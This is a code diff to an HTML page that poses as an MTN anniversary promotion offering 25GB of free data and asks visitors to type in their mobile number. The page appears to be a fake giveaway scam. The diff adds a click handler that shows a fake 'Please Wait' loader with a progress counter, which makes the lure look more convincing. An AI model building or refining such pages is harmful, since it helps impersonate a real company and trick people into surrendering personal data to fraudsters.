@@ -402,16 +402,25 @@ Get 25GB of Data as MTN celebrates 25 amazing years.
  
             
 
-            <button id="go"> <font color="black">GET 25GB</font></button>
-        </div>
-        <div id="loader">
-            <div>Please Wait ...</div>
-            <div class="spin"></div>
-            <div id="num">0%</div>
-        </div>
-        <div id="info">
-            <p class="title"> ENTER YOUR MOBILE NUMBER BELOW</p>
-            <div class="phone">
+          <button id="go" type="button">
+    <font color="black">GET 25GB</font>
+</button>
+
+<script>
+document.getElementById("go").addEventListener("click", function () {
+    document.getElementById("loader").style.display = "block";
+});
+</script>
+
+<div id="loader">
+    <div>Please Wait ...</div>
+    <div class="spin"></div>
+    <div id="num">0%</div>
+</div>
+
+<div id="info">
+    <p class="title">ENTER YOUR MOBILE NUMBER BELOW</p>
+    <div class="phone">
 <br/>
 
                   <center><input type="char" placeholder="Type Your Number Here" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);">
